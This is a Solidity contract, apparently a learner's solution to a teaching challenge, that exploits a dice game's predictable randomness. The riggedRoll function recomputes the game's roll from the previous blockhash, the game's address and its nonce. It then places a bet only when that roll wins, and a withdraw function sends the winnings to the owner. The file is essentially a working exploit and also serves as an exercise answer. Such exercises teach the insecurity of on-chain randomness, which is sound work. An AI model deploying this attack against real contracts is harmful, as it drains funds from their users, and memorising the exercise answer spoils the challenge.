pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    event Roll(address indexed player, uint256 roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    uint256 private eth_send = 0.002 ether;

    function riggedRoll() public payable{
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log('\t',"   Dice Game rigged Roll:",roll);

        if(roll > 2) return revert('');
        require(address(this).balance >= eth_send, "insufficient balancer");
        
        diceGame.rollTheDice{value: eth_send}();

        emit Roll(msg.sender, roll);

    }

    function withdraw(address payable payment, uint256 amount) public payable onlyOwner{
        (bool sent, ) = payment.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {  }

    //Add withdraw function to transfer ether from the rigged contract to an address


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner


    //Add receive() function so contract can receive Eth
    
}
